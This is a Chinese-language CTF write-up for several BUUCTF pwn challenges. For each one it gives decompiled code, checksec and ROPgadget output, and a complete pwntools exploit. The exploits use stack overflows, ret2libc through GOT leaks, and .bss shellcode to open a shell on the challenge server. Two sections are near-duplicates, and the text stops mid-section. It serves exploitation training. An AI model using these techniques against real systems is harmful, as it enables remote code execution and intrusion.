int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable()
{
  char buf[24]; // [esp+0h] [ebp-18h] BYREF

  return read(0, buf, 0x20u);
}
```

此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。

```c
int shell()
{
  return system("/bin/sh");
}
```

构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`flag{9a079da9-bb36-45c9-859b-bd86f27f1430}`即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27247)
e = ELF('./wustctf2020_getshell')
shell = e.symbols['shell'] # 0x804851B
log.success('shell_address => %s'%hex(shell))
payload = b'a'*0x18 + b'pwn!' + p32(shell)
io.sendline(payload)
io.interactive()
```

------

### [jarvisoj_level3](https://buuoj.cn/challenges#jarvisoj_level3)

先`file ./level3`查看文件类型，再`checksec --file=./level3`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level3
./level3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level3    
[*] '/home/tyd/ctf/pwn/buuctf/level3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`level3`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x88`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x100`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  write(1, "Input:\n", 7u);
  return read(0, buf, 0x100u);
}
```

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x88`个字节占满`buf`变量，然后再加上`4`个字节覆盖到`r`。

```assembly
-00000088 ; D/A/*   : change type (data/ascii/array)
-00000088 ; N       : rename
-00000088 ; U       : undefine
-00000088 ; Use data definition commands to create local variables and function arguments.
-00000088 ; Two special fields " r" and " s" represent return address and saved registers.
-00000088 ; Frame size: 88; Saved regs: 4; Purge: 0
-00000088 ;
-00000088
-00000088 buf             db 136 dup(?)
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`，然而打不通。

```bash
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27938)
elf = ELF('./level3')
main_addr = elf.symbols['main']
log.success("0x%x", main_addr)
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = b'a'*(0x88+0x4) 
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendlineafter(b'Input:\n', payload)
write_addr = u32(io.recv(4))
log.info('write_address => 0x%x', write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(main) + p32(bin_sh_addr)
io.recvuntil(b'Input:\n')
io.sendline(payload)
io.interactive()
```

用题目给出的`libc_32.so.6`来得到`write()`函数的偏移地址，从而计算出`libc`的基址地址`libcbase`，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，最后发送`payload`即可拿到`flag`。

编写`Python`代码求解，得到`flag{c999b5a3-c998-4cc5-978a-465c1bb9c00d}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27938)
elf = ELF('./level3')
main_addr = elf.symbols['main']
log.success("0x%x", main_addr)
write_plt = elf.plt['write']
write_got = elf.got['write']
payload = b'a'*(0x88+0x4) 
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
io.sendlineafter(b'Input:\n', payload)
write_addr = u32(io.recv(4))
log.info('write_address => 0x%x', write_addr)
libc = ELF('./libc/libc_32.so.6')
libcbase = write_addr - libc.symbols['write']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x88+0x4) + p32(system_addr) + p32(0) + p32(bin_sh_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [jarvisoj_level3_x64](https://buuoj.cn/challenges#jarvisoj_level3_x64)

先`file ./level3_x64`查看文件类型，再`checksec --file=./level3_x64`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./level3_x64
./level3_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f01f8fd41061f9dafb9399e723eb52d249a9b34d, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./level3_x64
[*] '/home/tyd/ctf/pwn/buuctf/level3_x64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`level2_x64`，，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function(argc, argv, envp);
  return write(1, "Hello, World!\n", 0xEuLL);
}
```

双击进入`vulnerable_function()`函数可以看到该函数中有一个`char`型局部变量`buf`，可用栈大小只有`0x80`个字节，但是`read()`函数读取时限制输入到`buf`的字节为`0x200`，显然存在栈溢出漏洞。

```c
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  write(1, "Input:\n", 7uLL);
  return read(0, buf, 0x200uLL);
}
```

双击`buf`变量查看其在函数栈中的情况，构造`payload`时可以先用`0x80`个字节占满`buf`变量，再用`0x8`个字节覆盖到栈帧`r`。

```assembly
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 buf             db 128 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x4006b3`，`pop rsi; pop r15; ret`的地址是`0x4006b1`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./level3_x64 --only "pop|ret"  
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret

Unique gadgets found: 11
```

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并利用`write()`函数泄露`write()`函数在`got`表中的真实地址。编写`Python`代码尝试使用`LibcSearcher`求解`libc`基地址，选用的`Libc`为`libc6_2.23-0ubuntu10_amd64`，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{1b9ca510-a63b-40f9-a036-28548b032739}`，提交即可。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29665)
elf = ELF('./level3_x64')
main_addr = elf.symbols['main']
write_plt = elf.plt['write'] 
write_got = elf.got['write']
pop_rdi = 0x4006b3  # pop rdi ; ret
pop_rsi = 0x4006b1  # pop rsi ; pop r15 ; ret
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
io.sendlineafter(b'Input:\n', payload)
write_addr = u64(io.recv(8))
log.info('write_address => 0x%x', write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x80+0x8) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input:\n', payload)
io.interactive()
```

------

### [ciscn_2019_c_1](https://buuoj.cn/challenges#ciscn_2019_c_1)

先`file ./ciscn_2019_c_1`查看文件类型再`checksec --file=./ciscn_2019_c_1`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_c_1
./ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_c_1
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`ciscn_2019_c_1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

输入`1`可调用`encrypt()`函数，双击`encrypt()`函数查看详情，`char`型数组`s`的可用栈大小为`0x50`字节，且`gets()`函数并不能限制`s`从标准输入中读取的字节长度，显然存在栈溢出漏洞。

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

在`Functions window`中并没有看到`system()`函数，`ROPgadget`也查不到，我们需要利用`gets()`函数的栈溢出漏洞来泄露出`puts()`函数的地址。由于题目并没有给出`libc.so.6`的版本，所以我们需要借助`LibcSearcher`来计算出`libc`的基地址，进而求得`system()`函数和`/bin/sh`的地址，最后劫持控制流获得靶机的`shell`权限。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400c83`，`ret`的地址为`0x4006b9`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_c_1 --only "pop|ret"  
Gadgets information
============================================================
0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c80 : pop r14 ; pop r15 ; ret
0x0000000000400c82 : pop r15 ; ret
0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop rbp ; ret
0x0000000000400aec : pop rbx ; pop rbp ; ret
0x0000000000400c83 : pop rdi ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b9 : ret
0x00000000004008ca : ret 0x2017
0x0000000000400962 : ret 0x458b
0x00000000004009c5 : ret 0xbf02

Unique gadgets found: 15
```

编写`Python`代码求解，得到`flag{ba4ddc51-c524-4cfe-93fd-911f7a10f2ef}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26769)
elf = ELF('./ciscn_2019_c_1')
pop_rdi = 0x400c83 # pop rdi; ret
ret = 0x4006b9 # ret
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.sendlineafter(b'Input your choice!', b'1')
payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.recvuntil(b'Ciphertext\n')
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info('puts_address => 0x%x', puts_addr)
libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.interactive()
```

------

### [ciscn_2019_en_2](https://buuoj.cn/challenges#ciscn_2019_en_2)

先`file ./ciscn_2019_en_2`查看文件类型再`checksec --file=./ciscn_2019_en_2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_en_2
./ciscn_2019_en_2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_en_2
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_en_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`ciscn_2019_en_2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

输入`1`可调用`encrypt()`函数，双击`encrypt()`函数查看详情，`char`型数组`s`的可用栈大小为`0x50`字节，且`gets()`函数并不能限制`s`从标准输入中读取的字节长度，显然存在栈溢出漏洞。

```c
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

在`Functions window`中并没有看到`system()`函数，`ROPgadget`也查不到，我们需要利用`gets()`函数的栈溢出漏洞来泄露出`puts()`函数的地址。由于题目并没有给出`libc.so.6`的版本，所以我们需要借助`LibcSearcher`来计算出`libc`的基地址，进而求得`system()`函数和`/bin/sh`的地址，最后劫持控制流获得靶机的`shell`权限。`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400c83`，`ret`的地址为`0x4006b9`。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./ciscn_2019_en_2 --only "pop|ret"  
Gadgets information
============================================================
0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c80 : pop r14 ; pop r15 ; ret
0x0000000000400c82 : pop r15 ; ret
0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop rbp ; ret
0x0000000000400aec : pop rbx ; pop rbp ; ret
0x0000000000400c83 : pop rdi ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b9 : ret
0x00000000004008ca : ret 0x2017
0x0000000000400962 : ret 0x458b
0x00000000004009c5 : ret 0xbf02

Unique gadgets found: 15
```

编写`Python`代码求解，得到`flag{17e9c174-32c6-4b4e-b10b-808e1e6ee482}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26769)
elf = ELF('./ciscn_2019_en_2')
pop_rdi = 0x400c83 # pop rdi; ret
ret = 0x4006b9 # ret
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
io.sendlineafter(b'Input your choice!', b'1')
payload = b'a'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.recvuntil(b'Ciphertext\n')
io.recvline()
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
log.info('puts_address => 0x%x', puts_addr)
libc = LibcSearcher('puts', puts_addr) # libc6_2.27-3ubuntu1_amd64
libcbase = puts_addr - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.dump('system')
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
log.success('bin_sh_address => %s', hex(bin_sh_addr))
payload = b'a'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Input your choice!', b'1')
io.sendlineafter(b'Input your Plaintext to be encrypted\n', payload)
io.interactive()
```

------

### [ciscn_2019_n_5](https://buuoj.cn/challenges#ciscn_2019_n_5)

先`file ./ciscn_2019_n_5`查看文件类型再`checksec --file=./ciscn_2019_n_5`检查文件保护情况。`NX disabled`栈可执行。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_n_5
./ciscn_2019_n_5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e420b4efe941251c692c93a7089b49b4319f891, with debug_info, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_n_5
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_n_5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开附件`ciscn_2019_n_5`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("tell me your name");
  read(0, name, 0x64uLL);
  puts("wow~ nice name!");
  puts("What do you want to say to me?");
  gets(text);
  return 0;
}
```

`name`变量是直接存储在`.bss`段上的，首地址为`0x601080`。我们可以通过`name`变量把`shellcode`直接写入到`.bss`段中。

```assembly
.bss:0000000000601080 name            db 64h dup(?)           ; DATA XREF: main+35↑o
.bss:00000000006010E4                 align 8
.bss:00000000006010E4 _bss            ends
```

`text`变量的可用栈大小为`0x20`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。双击`text`变量查看其栈结构，需要用`0x20`个字节来覆盖`padding`，还需要`0x8`个字节来覆盖到栈帧。

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 text            db 30 dup(?)
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

我们可以通过这个栈溢出漏洞劫持程序控制流去执行刚刚写入到`.bss`段中的`shellcode`。

编写`Python`代码求解，得到`flag{f3eef899-2d9e-4f87-9ebe-d19d0edffc77}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28021)
bss_addr = 0x601080 # name
shellcode = asm(shellcraft.sh())
io.sendlineafter(b'tell me your name', shellcode)
payload = b'a'*(0x20+0x8) + p64(bss_addr)
io.sendlineafter(b'What do you want to say to me?', payload)
io.interactive()
```

------

### [ciscn_2019_ne_5](https://buuoj.cn/challenges#ciscn_2019_ne_5)

先`file ./ciscn_2019_ne_5`查看文件类型再`checksec --file=./ciscn_2019_ne_5`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./ciscn_2019_ne_5
./ciscn_2019_ne_5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6482843cea0a0b348169075298025f13ef6c6ec2, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./ciscn_2019_ne_5
[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_ne_5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开`./ciscn_2019_ne_5`后按`F5`反汇编源码并查看主函数，可以看到`admin`的密码是`administrator`。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-100h] BYREF
  char src[4]; // [esp+4h] [ebp-FCh] BYREF
  char v6[124]; // [esp+8h] [ebp-F8h] BYREF
  char s1[4]; // [esp+84h] [ebp-7Ch] BYREF
  char v8[96]; // [esp+88h] [ebp-78h] BYREF
  int *v9; // [esp+F4h] [ebp-Ch]

  v9 = &argc;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  fflush(stdout);
  *(_DWORD *)s1 = 48;
  memset(v8, 0, sizeof(v8));
  *(_DWORD *)src = 48;
  memset(v6, 0, sizeof(v6));
  puts("Welcome to use LFS.");
  printf("Please input admin password:");
  __isoc99_scanf("%100s", s1);
  if ( strcmp(s1, "administrator") )      // admin登录密码是明文存储的
  {
    puts("Password Error!");
    exit(0);
  }
  puts("Welcome!");
  puts("Input your operation:");
  puts("1.Add a log.");
  puts("2.Display all logs.");
  puts("3.Print all logs.");
  printf("0.Exit\n:");
  __isoc99_scanf("%d", &v4);
  switch ( v4 )
  {
    case 0:
      exit(0);
      return result;
    case 1:
      AddLog(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 2:
      Display(src);
      result = sub_804892B(argc, argv, envp);
      break;
    case 3:
      Print();
      result = sub_804892B(argc, argv, envp);
      break;
    case 4:
      GetFlag(src);
      result = sub_804892B(argc, argv, envp);
      break;
    default:
      result = sub_804892B(argc, argv, envp);
      break;
  }
  return result;
}
```

双击`AddLog(src);`查看函数详情，有个`scanf`函数。

```c
int __cdecl AddLog(int a1)
{
  printf("Please input new log info:");
  return __isoc99_scanf("%128s", a1);
}
```

双击`Display(src);`查看函数详情，返回值是直接调用了`puts`函数。

```c
int __cdecl Display(char *s)
{
  return puts(s);
}
```

双击`Print();`查看函数详情，可以得知程序中存在系统调用函数`system`，通过`elf.symbols['system']`可获得`system`的函数地址。

```c
int Print()
{
  return system("echo Printing......");
}
```

双击`GetFlag();`查看函数详情，`dest`直接拷贝`AddLog`中的实参`src`，`dest`需要`0x48`个字节填满`padding`，覆盖到栈帧还需`4`字节。

```c
int __cdecl GetFlag(char *src)
{
  char dest[4]; // [esp+0h] [ebp-48h] BYREF
  char v3[60]; // [esp+4h] [ebp-44h] BYREF

  *(_DWORD *)dest = 48;
  memset(v3, 0, sizeof(v3));
  strcpy(dest, src);
  return printf("The flag is your log:%s\n", dest);
}
```

用`ROPgadget`查询`"/bin/sh"`字符串未果，但是可以找到`"sh"`字符串。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
